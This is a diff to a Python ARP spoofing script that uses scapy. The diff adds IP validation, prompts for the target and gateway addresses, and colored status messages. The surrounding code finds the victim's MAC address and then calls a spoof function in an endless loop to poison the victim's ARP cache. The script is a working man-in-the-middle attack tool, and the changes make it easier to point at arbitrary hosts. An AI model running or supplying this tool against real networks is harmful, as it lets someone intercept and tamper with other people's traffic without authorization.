@@ -1,4 +1,13 @@
 import scapy.all as scapy
+import ipaddress
+from colorama import Fore, Back, Style
+
+def valid_ip_address(ip_address):
+    try:
+        ip = ipaddress.ip_address(ip_address)
+        return True
+    except ValueError:
+        return False
 
 def get_MAC(target_ip):
     arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip)
@@ -13,15 +22,25 @@ def spoof(target_ip,target_mac,spoof_ip):
 
 
 def main():
-    target_ip = "192.168.1.213"
-    getway_ip = "192.168.1.1"
+    target_ip = input("Enter target-ip: ")
+    valid_ip_target = valid_ip_address(target_ip)
+    getway_ip = input("Enter getway-ip: ")
+    valid_ip_getway = valid_ip_address(getway_ip)
+
+    if valid_ip_target is False or valid_ip_getway is False:
+        print(Fore.RED+"IP validation test failed")
+        return None
+    
     target_mac = None
+    print(Fore.YELLOW+"Searching for the MAC address...")
     while not target_mac:
         target_mac = get_MAC(target_ip)
-        if not target_mac:
-            print("MAC adress was not found...")
-    print("The MAC adress is:{}".format(target_mac))
-    print("spoofer is active!")
+
+    print(Fore.GREEN+"MAC address was found!")
+    print(Fore.YELLOW+"The MAC adress is:{}".format(target_mac))
+    print(Fore.BLUE+"spoofer is active!")
+    Fore.RESET
+
     while True:
         spoof(target_ip,target_mac,getway_ip)
 
